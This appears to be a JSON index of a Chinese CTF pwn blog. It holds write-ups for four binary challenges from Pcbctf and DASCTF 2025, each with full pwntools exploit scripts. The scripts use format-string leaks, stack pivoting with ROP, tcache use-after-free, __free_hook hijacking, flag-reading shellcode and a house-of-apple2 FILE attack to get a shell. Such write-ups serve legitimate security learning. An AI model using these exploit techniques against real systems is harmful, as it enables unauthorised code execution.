{"meta":{"title":"zzzz","subtitle":"","description":"CTF & PWN 学习笔记","author":"John Doe","url":"https://z-z27.github.io","root":"/"},"pages":[],"posts":[{"title":"Pcbctf-pwn部分解","slug":"Pcbctf","date":"2025-12-15T15:00:00.000Z","updated":"2025-12-16T14:24:58.930Z","comments":true,"path":"2025/12/15/Pcbctf/","permalink":"https://z-z27.github.io/2025/12/15/Pcbctf/","excerpt":"","text":"Pcbctf-pwn(部分解)myzoo分析：先checksec一下，保护全开，随后使用IDA打开。 结构比较奇怪，逆向也稍微偏奇怪。 总的来说，程序有3个部分，dog,cat和bird，通过ptr的值来选择不同分支。 dog: 如果ptr 为3即初始值，便会对ptr的地址赋上dog的信息，在dog函数里面无论如何都会重置ptr的信息，然后将ptr 改为初始值。 cat: 和dog类似，但输入yes可以修改ptr + 8 处的信息，大小为0x20。只要输入yes就可以不将ptr清空，有利用空间 bird: 和cat类似，输入2次yes，可以在ptr + 44处进行溢出，大小为0x2c 漏洞点：bird可以溢出，cat也可以，dog处有格式化漏洞，可以用来泄露栈上的_libc_main来泄露libc_base 所以对应思路是利用bird进行溢出，可以修改dog和cat对应的指针并且不会被重置。然后再利用cat 修改ptr + 8的信息，随后选择dog可以泄露libc_base，此时ptr的信息会被重置，这时再选择利用bird修改对应指针为system，然后利用cat 修改ptr+8为&#x2F;bin&#x2F;sh\\x00。再选择调用cat这样就可以获得shell。 利用：先接收地址，获得pie_addr: 123456789101112131415from pwn import *io = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc.so.6&quot;)context.log_level = &#x27;debug&#x27;io.recvuntil(b&#x27;gift@&#x27;)addr1 = int(io.recv(16),16)print(&quot;addr:&quot;,hex(addr1))pie = addr1 - 0x12c9 print(&quot;pie:&quot;,hex(pie)) 利用bird溢出修改ptr + 48 和 ptr + 80处为可运行的函数地址,这样可以避免在调用dog和cat下面函数的时候出现问题： 12(*((void (__fastcall **)(char *))ptr + 10))((char *)ptr + 8); #dog(*((void (__fastcall **)(char *))ptr + 6))((char *)ptr + 8); #cat 123456io.sendline(b&#x27;3&#x27;)io.sendline(b&#x27;yes&#x27;)io.sendline(b&#x27;yes&#x27;)payload1 = b&#x27;a&#x27; *4 + p64(addr1) + b&#x27;a&#x27;*24 + p64(addr1)io.sendline(payload1) 利用cat修改ptr + 8处的内容，再利用dog泄露libc_base: 12345678910111213141516io.sendline(b&#x27;2&#x27;)io.sendline(b&#x27;yes&#x27;)io.sendline(b&#x27;%43$p&#x27;)io.sendline(b&#x27;1&#x27;)io.recvuntil(b&#x27;: 1&#x27;)io.recvuntil(b&#x27;: 1&#x27;)io.recvuntil(b&#x27;: 1&#x27;)io.recvuntil(b&#x27;\\n&#x27;)addr2 = int(io.recv(16),16)print(&quot;addr2:&quot;,hex(addr2))libc_base = addr2 - 0x29e40print(&quot;libc_base:&quot;,hex(libc_base)) 再利用bird修改ptr + 48的内容为system，选择cat修改ptr + 8为&#x2F;bin&#x2F;sh，然后再选择cat即可利用下面函数触发，获得shell 1(*((void (__fastcall **)(char *))ptr + 6))((char *)ptr + 8); 1234567891011121314sys = libc_base + libc.sym[&quot;system&quot;]io.sendline(b&#x27;no&#x27;)io.sendline(b&#x27;3&#x27;)io.sendline(b&#x27;yes&#x27;)io.sendline(b&#x27;yes&#x27;)sleep(1)io.sendline(b&#x27;a&#x27;*4 + p64(sys))io.sendline(b&#x27;2&#x27;)io.sendline(b&#x27;yes&#x27;)io.sendline(b&#x27;/bin/sh\\x00&#x27;)gdb.attach(io)io.interactive() Exp:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *io = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc.so.6&quot;)context.log_level = &#x27;debug&#x27;io.recvuntil(b&#x27;gift@&#x27;)addr1 = int(io.recv(16),16)print(&quot;addr:&quot;,hex(addr1))pie = addr1 - 0x12c9 print(&quot;pie:&quot;,hex(pie))io.sendline(b&#x27;3&#x27;)io.sendline(b&#x27;yes&#x27;)io.sendline(b&#x27;yes&#x27;)payload1 = b&#x27;a&#x27; *4 + p64(addr1) + b&#x27;a&#x27;*24 + p64(addr1)io.sendline(payload1)io.sendline(b&#x27;2&#x27;)io.sendline(b&#x27;yes&#x27;)io.sendline(b&#x27;%43$p&#x27;)io.sendline(b&#x27;1&#x27;)io.recvuntil(b&#x27;: 1&#x27;)io.recvuntil(b&#x27;: 1&#x27;)io.recvuntil(b&#x27;: 1&#x27;)io.recvuntil(b&#x27;\\n&#x27;)addr2 = int(io.recv(16),16)print(&quot;addr2:&quot;,hex(addr2))libc_base = addr2 - 0x29e40print(&quot;libc_base:&quot;,hex(libc_base))sys = libc_base + libc.sym[&quot;system&quot;]io.sendline(b&#x27;no&#x27;)io.sendline(b&#x27;3&#x27;)io.sendline(b&#x27;yes&#x27;)io.sendline(b&#x27;yes&#x27;)sleep(1)io.sendline(b&#x27;a&#x27;*4 + p64(sys))io.sendline(b&#x27;2&#x27;)io.sendline(b&#x27;yes&#x27;)io.sendline(b&#x27;/bin/sh\\x00&#x27;)gdb.attach(io)io.interactive() Pivoting分析：checksec一下没canary,Partial RELRO,有NX,没PIE,使用IDA打开 程序在Business函数里面很明显存在溢出，可以实现栈迁移。 利用栈溢出多次提前修改rbp和rsp即可，直到获得shell即可 利用：先利用利用程序的泄露获得栈上的地址 1234567891011121314from pwn import *#io = process(&quot;./pwn&quot;)io = remote(&quot;192.168.18.21&quot;,26005)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc.so.6&quot;)#context.log_level = &#x27;debug&#x27;io.recvuntil(b&#x27;Please tell me your name\\n&#x27;)addr1 = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(&quot;addr1:&quot;,hex(addr1))#gdb.attach(io)io.sendline(b&#x27;zzzz&#x27;) 随后便先将rbp修改为栈上的地址，这样可以利用后续将rbp修改成想要的地址 12345678io.recvuntil(b&#x27;What can I do for you?&#x27;)io.sendline(b&#x27;1&#x27;)io.recvuntil(b&#x27;How much money would you like to withdraw?&#x27;)bss = 0x404900payload =p64(bss)+ b&#x27;a&#x27;* (0x30)+p64(bss+0x38)+p64(0x401389)+p64(0x4044c0) + p64(addr1-0x168 +0x38) + p64(0x401389)io.sendline(b&#x27;100&#x27;)io.recvuntil(b&#x27;Are you sure?&#x27;)io.send(payload) 随后利用read + puts泄露libc_base 1234567891011121314151617181920io.recvuntil(b&#x27;What can I do for you?&#x27;)io.sendline(b&#x27;0&#x27;)io.recvuntil(b&#x27;How much money would you like to save?&#x27;)io.sendline(b&#x27;100&#x27;)pop_rdi = 0x00000000004014f5pop_rsi_r15 = 0x00000000004014f3write_addr = elf.sym[&quot;write&quot;]io.recvuntil(b&#x27;Thanks for your coming\\n&#x27;)io.sendline(p64(0x404938))io.recvuntil(b&#x27;I know\\n&#x27;)sleep(1)io.sendline(p64(bss+0x38)+p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(elf.got[&quot;write&quot;]) + p64(0) + p64(write_addr)+p64(0x401389))io.recvuntil(b&#x27;I know\\n&#x27;)write_addr = u64(io.recv(7).ljust(8,b&#x27;\\x00&#x27;))print(&quot;write:&quot;,hex(write_addr))libc_base = write_addr - libc.sym[&quot;write&quot;]print(&quot;libc_base:&quot;,hex(libc_base))bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))system = libc_base + libc.sym[&quot;system&quot;] 控制rbp获得shell (选择的bss最好靠后,便于后续system的时候不出错) 123payload = p64(0x00000000004014f5) + p64(0x00000000004014f5) + p64(bin_sh)+ p64(system)io.send(payload)io.interactive() Exp:12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *#io = process(&quot;./pwn&quot;)io = remote(&quot;192.168.18.21&quot;,26005)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc.so.6&quot;)#context.log_level = &#x27;debug&#x27;io.recvuntil(b&#x27;Please tell me your name\\n&#x27;)addr1 = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(&quot;addr1:&quot;,hex(addr1))#gdb.attach(io)io.sendline(b&#x27;zzzz&#x27;)io.recvuntil(b&#x27;What can I do for you?&#x27;)io.sendline(b&#x27;1&#x27;)io.recvuntil(b&#x27;How much money would you like to withdraw?&#x27;)bss = 0x404900payload =p64(bss)+ b&#x27;a&#x27;* (0x30)+p64(bss+0x38)+p64(0x401389)+p64(0x4044c0) + p64(addr1-0x168 +0x38) + p64(0x401389)io.sendline(b&#x27;100&#x27;)io.recvuntil(b&#x27;Are you sure?&#x27;)io.send(payload)io.recvuntil(b&#x27;What can I do for you?&#x27;)io.sendline(b&#x27;0&#x27;)io.recvuntil(b&#x27;How much money would you like to save?&#x27;)io.sendline(b&#x27;100&#x27;)pop_rdi = 0x00000000004014f5pop_rsi_r15 = 0x00000000004014f3write_addr = elf.sym[&quot;write&quot;]io.recvuntil(b&#x27;Thanks for your coming\\n&#x27;)io.sendline(p64(0x404938))io.recvuntil(b&#x27;I know\\n&#x27;)sleep(1)io.sendline(p64(bss+0x38)+p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(elf.got[&quot;write&quot;]) + p64(0) + p64(write_addr)+p64(0x401389))io.recvuntil(b&#x27;I know\\n&#x27;)write_addr = u64(io.recv(7).ljust(8,b&#x27;\\x00&#x27;))print(&quot;write:&quot;,hex(write_addr))libc_base = write_addr - libc.sym[&quot;write&quot;]print(&quot;libc_base:&quot;,hex(libc_base))bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))system = libc_base + libc.sym[&quot;system&quot;]payload = p64(0x00000000004014f5) + p64(0x00000000004014f5) + p64(bin_sh)+ p64(system)io.send(payload)io.interactive() 其他的题目等有时间复现后再写","categories":[{"name":"pwn","slug":"pwn","permalink":"https://z-z27.github.io/categories/pwn/"}],"tags":[{"name":"wp","slug":"wp","permalink":"https://z-z27.github.io/tags/wp/"}]},{"title":"Dasctf-2025-下半年(pwn 部分解)","slug":"dasctf","date":"2025-12-10T15:00:00.000Z","updated":"2025-12-16T14:05:59.389Z","comments":true,"path":"2025/12/10/dasctf/","permalink":"https://z-z27.github.io/2025/12/10/dasctf/","excerpt":"","text":"Dasctf-2025-下半年rcms分析：checksec一下什么保护都开了，有简陋沙箱，可以打orw，使用IDA打开 有很明显的UAF 同时还有gift这个后面函数，只要使得程序的执行流执行到这里便可以传入shellcode，获得flag。 进行尝试，发现libc版本对应2.27从docker上取下来，glibc2.27条件下tcache基本没有保护 然后先填充满tcache，利用unsortedbin泄露libc_base。 再泄露heap，利用tcache泄露gift地址 再修改free_hook地址为gift地址即可进入后面函数，即可注入shellcode 利用：泄露libc_base: 123456789101112add(7,0x400,b&#x27;a&#x27;)add(8,0x20,b&#x27;a&#x27;)for i in range(7): free(i)free(7)show(7)io.recv()addr1 = u64(io.recvuntil(b&#x27;\\n&#x27;,drop = True).ljust(8,b&#x27;\\x00&#x27;))print(&quot;addr1:&quot;,hex(addr1))libc_base = addr1 - 0x3ebca0print(&quot;libc_base:&quot;,hex(libc_base))#libc_base 泄露heap,gift地址 1234567891011121314151617show(2)io.recv()addr2 = u64(io.recvuntil(b&#x27;\\n&#x27;,drop = True).ljust(8,b&#x27;\\x00&#x27;))print(&quot;addr2:&quot;,hex(addr2))heap = addr2 - 0x16b0print(&quot;heap:&quot;,hex(heap))#heap_addradd(9,0x20,b&#x27;a&#x27;)free(9)edit(9,p64(heap +0x250))add(10,0x20,b&#x27;a&#x27;)add(11,0x20,b&#x27;a&#x27;*0x10)show(11)io.recvuntil(b&#x27;a&#x27;*0x10)addr3 = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(&quot;addr3:&quot;,hex(addr3)) 利用__free_hook控制执行流，注入shellcode 1234567891011121314151617181920212223242526272829add(12,0x70,b&#x27;a&#x27;)free(12)edit(12,p64(libc_base + libc.sym[&quot;__free_hook&quot;]))add(13,0x70,b&#x27;a&#x27;)add(14,0x70,p64(addr3))free(14)shellcode = &quot;&quot;&quot;push 0x67616c66mov rdi,rspxor esi,esipush 2pop raxsyscallmov rdi,raxmov rsi,rspmov edx,0x100xor eax,eaxsyscallmov edi,1mov rsi,rsppush 1pop raxsyscall&quot;&quot;&quot;io.recvuntil(b&#x27;what are u want say to me?&#x27;)io.send(asm(shellcode))#gdb.attach(io)io.interactive() Exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102from pwn import *context.arch = &#x27;amd64&#x27; #io = process(&quot;./pwn&quot;)io = remote(&quot;node5.buuoj.cn&quot;,26098)libc = ELF(&quot;./libc.so.6&quot;)#context.log_level = &#x27;debug&#x27;def add(x,y,z): io.recvuntil(b&#x27;5.exit&#x27;) io.sendline(b&#x27;1&#x27;) io.recvuntil(b&#x27;which one do u want to connect:&#x27;) io.sendline(str(x)) io.recvuntil(b&#x27;how much time do u want:&#x27;) io.sendline(str(y)) io.recvuntil(b&#x27;plz input cmd:&#x27;) io.send(z)def free(x): io.recvuntil(b&#x27;5.exit&#x27;) io.sendline(b&#x27;2&#x27;) io.recvuntil(b&#x27;which connection do u want to delet:&#x27;) io.sendline(str(x))def show(x): io.recvuntil(b&#x27;5.exit&#x27;) io.sendline(b&#x27;4&#x27;) io.recvuntil(b&#x27;which connection do u want to show:&#x27;) io.sendline(str(x))def edit(x,y): io.recvuntil(b&#x27;5.exit&#x27;) io.sendline(b&#x27;3&#x27;) io.recvuntil(b&#x27;which connection do u want to change:&#x27;) io.sendline(str(x)) io.recvuntil(b&#x27;plz input ur cmd:&#x27;) io.send(y)for i in range(7): add(i,0x400,b&#x27;a&#x27;)add(7,0x400,b&#x27;a&#x27;)add(8,0x20,b&#x27;a&#x27;)for i in range(7): free(i)free(7)show(7)io.recv()addr1 = u64(io.recvuntil(b&#x27;\\n&#x27;,drop = True).ljust(8,b&#x27;\\x00&#x27;))print(&quot;addr1:&quot;,hex(addr1))libc_base = addr1 - 0x3ebca0print(&quot;libc_base:&quot;,hex(libc_base))#libc_baseshow(2)io.recv()addr2 = u64(io.recvuntil(b&#x27;\\n&#x27;,drop = True).ljust(8,b&#x27;\\x00&#x27;))print(&quot;addr2:&quot;,hex(addr2))heap = addr2 - 0x16b0print(&quot;heap:&quot;,hex(heap))#heap_addradd(9,0x20,b&#x27;a&#x27;)free(9)edit(9,p64(heap +0x250))add(10,0x20,b&#x27;a&#x27;)add(11,0x20,b&#x27;a&#x27;*0x10)show(11)io.recvuntil(b&#x27;a&#x27;*0x10)addr3 = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(&quot;addr3:&quot;,hex(addr3))add(12,0x70,b&#x27;a&#x27;)free(12)edit(12,p64(libc_base + libc.sym[&quot;__free_hook&quot;]))add(13,0x70,b&#x27;a&#x27;)add(14,0x70,p64(addr3))free(14)shellcode = &quot;&quot;&quot;push 0x67616c66mov rdi,rspxor esi,esipush 2pop raxsyscallmov rdi,raxmov rsi,rspmov edx,0x100xor eax,eaxsyscallmov edi,1mov rsi,rsppush 1pop raxsyscall&quot;&quot;&quot;io.recvuntil(b&#x27;what are u want say to me?&#x27;)io.send(asm(shellcode))#gdb.attach(io)io.interactive() CV_Manager比赛时没注意到有UAF，是赛后复现的 分析：先checksec一下，什么保护都开了，使用IDA打开 在case5的情况下有沙箱，而且非常严重，很难利用。 login登录只需要随便逆向一下就行。 在add的时候会申请了一个chunk，然后在一个地方储存name，然后在edit的时候 会向chunk里面写入东西。 delete里面没有UAF，show可以正常使用。 在gift里面有个free但却没有置0，有UAF 所以可以选择先填充满tcache并将一个chunk放到unsorted bin里面，然后将其重新申请回来，这样利用show就可以泄露libc_base,heap地址 然后利用UAF修改指针，起到任意写的效果，选择修改stdout，利用puts去触发house of apple2，即可控制执行流，并且不经过沙箱 利用：先泄露heap和libc_base: 123456789101112131415161718192021222324for i in range(8): add(0x110,b&#x27;CCTTFFEERR!!&#x27;)add(0x100,b&#x27;a&#x27;) # 8for i in range(8): free(i)for i in range(7): add(0x110,b&#x27;a&#x27;)add(0x100,b&#x27;a&#x27;)show(6)io.recv()io.recvuntil(b&#x27;introduction:&#x27;)addr1 = u64(io.recv(8))print(&quot;addr1:&quot;,hex(addr1))heap = addr1 * 0x1000print(&quot;heap:&quot;,hex(heap))show(7)io.recv()io.recvuntil(b&#x27;introduction:&#x27;)addr2 = u64(io.recv(8))print(&quot;addr2:&quot;,hex(addr2))libc_base = addr2 -0x21adf0print(&quot;libc_base:&quot;,hex(libc_base)) 随后利用gift函数利用UAF，将stdout添加到tcache链上 123456789add(0x200,b&#x27;CCTTFFEERR!!&#x27;) # 9add(0x200,b&#x27;a&#x27;) # 10free(10)gift(9)io.recv()addr3 = u64(io.recv(8)) - 0x5270print(&quot;addr3:&quot;,hex(addr3))edit(9,p64(addr1 ^ (libc_base + libc.sym[&quot;_IO_2_1_stdout_&quot;]))) 随后对stdout进行编辑，因为是通过puts进行触发，所有对检查更加严格 调用流程：puts-&gt; _Io_wfile_xsputn-&gt; _IO_wdefault_xsputn -&gt; _IO_wfile_overflow -&gt; _IO_wdoallocbuf 从而触发setcontrext + 61，然后利用read向rsp后续部分输入system 123456789101112131415161718192021222324252627282930313233add(0x200,b&#x27;a&#x27;) # 10add(0x200,b&#x27;a&#x27;) # 11print(&quot;tiaoshi&quot;,hex(libc_base + libc.sym[&quot;setcontext&quot;] + 61))gdb.attach(io)system = libc_base + libc.sym[&#x27;system&#x27;]binsh = libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))pop_rdi = libc_base + 0x000000000002a3e5 setcontext = libc_base + libc.sym[&#x27;setcontext&#x27;]_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]fake_addr = libc_base + libc.sym[&#x27;_IO_2_1_stdout_&#x27;]print(&quot;fkae_addr:&quot;,hex(fake_addr))payload = flat(&#123; 0x20: p64(libc_base + libc.sym[&quot;read&quot;]), 0x50: p64(0), 0x58: p64(fake_addr + 0x28), 0x70: p64(0x100), 0x88: p64(fake_addr + 0x28), 0xa0: p64(fake_addr - 0x18), 0x90: p64(libc_base + libc.sym[&quot;read&quot;]), 0xc8: p64(fake_addr + 0x68), 0xd0: p64(setcontext + 61), 0xd8: p64(_IO_wfile_jumps),&#125;, filler=b&#x27;\\x00&#x27;)ret = libc_base + 0x0000000000029139edit(11,payload) 输入system(“&#x2F;bin&#x2F;sh”)获得shell 12io.sendline( p64(pop_rdi) + p64(binsh) +p64(ret)+ p64(system))io.interactive() Exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119from pwn import *io = process(&quot;./pwn&quot;)libc= ELF(&quot;./libc.so.6&quot;)#context.log_level = &#x27;debug&#x27;io.recvuntil(b&#x27;username:&#x27;)io.sendline(b&#x27;r00t&#x27;)io.recvuntil(b&#x27;password:&#x27;)io.sendline(b&#x27;p9s3w0r6&#x27;)def add(x,y): io.recvuntil(b&#x27;Your choice:&#x27;) io.sendline(b&#x27;1&#x27;) io.recvuntil(b&#x27;Introduction length:&#x27;) io.sendline(str(x)) io.recvuntil(b&#x27;your name:&#x27;) io.send(y)def edit(x,y): io.recvuntil(b&#x27;Your choice:&#x27;) io.sendline(b&#x27;2&#x27;) io.recvuntil(b&#x27;Which CV do you want to modify:&#x27;) io.sendline(str(x)) io.recvuntil(b&#x27;Please briefly introduce yourself:&#x27;) io.send(y)def free(x): io.recvuntil(b&#x27;Your choice:&#x27;) io.sendline(b&#x27;3&#x27;) io.recvuntil(b&#x27;Which CV do you want to remove:&#x27;) io.sendline(str(x))def show(x): io.recvuntil(b&#x27;Your choice:&#x27;) io.sendline(b&#x27;4&#x27;) io.recvuntil(b&#x27;Which CV do you want to view:&#x27;) io.sendline(str(x))def gift(x): io.recvuntil(b&#x27;Your choice:&#x27;) io.sendline(b&#x27;666&#x27;) io.recvuntil(b&#x27;index:&#x27;) io.sendline(str(x))for i in range(8): add(0x110,b&#x27;CCTTFFEERR!!&#x27;)add(0x100,b&#x27;a&#x27;) # 8for i in range(8): free(i)for i in range(7): add(0x110,b&#x27;a&#x27;)add(0x100,b&#x27;a&#x27;)show(6)io.recv()io.recvuntil(b&#x27;introduction:&#x27;)addr1 = u64(io.recv(8))print(&quot;addr1:&quot;,hex(addr1))heap = addr1 * 0x1000print(&quot;heap:&quot;,hex(heap))show(7)io.recv()io.recvuntil(b&#x27;introduction:&#x27;)addr2 = u64(io.recv(8))print(&quot;addr2:&quot;,hex(addr2))libc_base = addr2 -0x21adf0print(&quot;libc_base:&quot;,hex(libc_base))add(0x200,b&#x27;CCTTFFEERR!!&#x27;) # 9add(0x200,b&#x27;a&#x27;) # 10free(10)gift(9)io.recv()addr3 = u64(io.recv(8)) - 0x5270print(&quot;addr3:&quot;,hex(addr3))edit(9,p64(addr1 ^ (libc_base + libc.sym[&quot;_IO_2_1_stdout_&quot;])))#gdb.attach(io)add(0x200,b&#x27;a&#x27;) # 10add(0x200,b&#x27;a&#x27;) # 11print(&quot;tiaoshi&quot;,hex(libc_base + libc.sym[&quot;setcontext&quot;] + 61))gdb.attach(io)system = libc_base + libc.sym[&#x27;system&#x27;]binsh = libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))pop_rdi = libc_base + 0x000000000002a3e5 setcontext = libc_base + libc.sym[&#x27;setcontext&#x27;]_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]fake_addr = libc_base + libc.sym[&#x27;_IO_2_1_stdout_&#x27;]print(&quot;fkae_addr:&quot;,hex(fake_addr))payload = flat(&#123; 0x20: p64(libc_base + libc.sym[&quot;read&quot;]), 0x50: p64(0), 0x58: p64(fake_addr + 0x28), 0x70: p64(0x100), 0x88: p64(fake_addr + 0x28), 0xa0: p64(fake_addr - 0x18), 0x90: p64(libc_base + libc.sym[&quot;read&quot;]), 0xc8: p64(fake_addr + 0x68), 0xd0: p64(setcontext + 61), 0xd8: p64(_IO_wfile_jumps),&#125;, filler=b&#x27;\\x00&#x27;)ret = libc_base + 0x0000000000029139edit(11,payload)io.sendline( p64(pop_rdi) + p64(binsh) +p64(ret)+ p64(system))io.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"https://z-z27.github.io/categories/pwn/"}],"tags":[{"name":"wp","slug":"wp","permalink":"https://z-z27.github.io/tags/wp/"}],"author":"zzzz"}],"categories":[{"name":"pwn","slug":"pwn","permalink":"https://z-z27.github.io/categories/pwn/"}],"tags":[{"name":"wp","slug":"wp","permalink":"https://z-z27.github.io/tags/wp/"}]}